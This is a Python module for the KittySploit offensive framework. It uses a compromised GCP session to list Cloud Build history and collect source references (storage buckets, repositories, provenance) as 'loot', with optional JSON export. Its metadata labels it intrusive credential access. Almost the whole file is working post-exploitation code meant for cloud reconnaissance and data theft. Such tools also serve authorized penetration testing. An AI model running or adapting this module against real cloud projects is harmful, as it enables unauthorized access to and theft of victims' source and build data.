#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json

from kittysploit import *
from lib.post.gcp import GcpPostMixin


class Module(Post, GcpPostMixin):
    __info__ = {
        "name": "GCP Cloud Build Source Refs Loot",
        "description": "Extract Cloud Build source references (GCS, CSR, Git, connected repos) from build history",
        "author": "KittySploit Team",
        "session_type": SessionType.GCP_API,
        "tags": ["gcp", "cloud", "cloud-build", "source", "loot", "ci"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['credential_access', 'api_request'],
        'expected_requests': 5,
        'reversible': False,
        'approval_required': True,
        'produces': ['credentials', 'risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    max_builds = OptInteger(30, "Maximum builds to inspect", False)
    unique_only = OptBool(True, "Deduplicate identical source references", False)
    include_provenance = OptBool(True, "Include sourceProvenance blocks when present", False)
    export_json = OptString("", "Optional output JSON file", False)

    def run(self):
        try:
            project_id = self._gcp_project_id()
            if not project_id:
                print_error("Could not resolve project_id from session")
                return False

            builds = self._list_builds(project_id)
            if not builds:
                print_warning("No Cloud Build history found")
                return self.module_result(success=True, data={"source_refs": []})

            max_builds = max(1, int(self.max_builds or 30))
            loot = []
            seen = set()

            print_info(f"Extracting source refs from {min(len(builds), max_builds)} build(s)...")
            for build in builds[:max_builds]:
                build_id = str(build.get("id") or build.get("name") or "").rsplit("/", 1)[-1]
                refs = self._gcp_extract_build_source_refs(build.get("source"))
                provenance_refs = []
                if self.include_provenance:
                    provenance = build.get("sourceProvenance") or {}
                    if provenance.get("resolvedStorageSource"):
                        provenance_refs.extend(
                            self._gcp_extract_build_source_refs(
                                {"storageSource": provenance.get("resolvedStorageSource")}
                            )
                        )
                    if provenance.get("resolvedRepoSource"):
                        provenance_refs.extend(
                            self._gcp_extract_build_source_refs(
                                {"repoSource": provenance.get("resolvedRepoSource")}
                            )
                        )

                all_refs = refs + provenance_refs
                if not all_refs:
                    continue

                entry = {
                    "build_id": build_id,
                    "status": build.get("status"),
                    "createTime": build.get("createTime"),
                    "source_refs": all_refs,
                }

                fingerprint = json.dumps(all_refs, sort_keys=True, default=str)
                if self.unique_only:
                    if fingerprint in seen:
                        continue
                    seen.add(fingerprint)

                loot.append(entry)
                print_info(f"Build {build_id} status={build.get('status')}")
                for ref in all_refs:
                    print_success(f"  [{ref.get('type')}] {json.dumps(ref.get('details'), ensure_ascii=False)[:300]}")
                print_info("-" * 80)

            payload = {"project_id": project_id, "source_refs": loot}
            exported = self._gcp_export_json(self.export_json, payload) if self.export_json else ""
            if exported:
                print_success(f"Loot exported to {exported}")
            print_success(f"Extracted source refs from {len(loot)} build(s)")
            return self.module_result(success=True, data=payload)
        except Exception as exc:
            print_error(f"Cloud Build source refs loot failed: {exc}")
            return False

    def _list_builds(self, project_id):
        quoted = self._quote_project(project_id)
        url = f"https://cloudbuild.googleapis.com/v1/projects/{quoted}/builds"
        max_builds = max(1, int(self.max_builds or 30))
        return self._gcp_paginate_get(url, "builds", max_items=max_builds, params={"pageSize": min(max_builds, 100)})
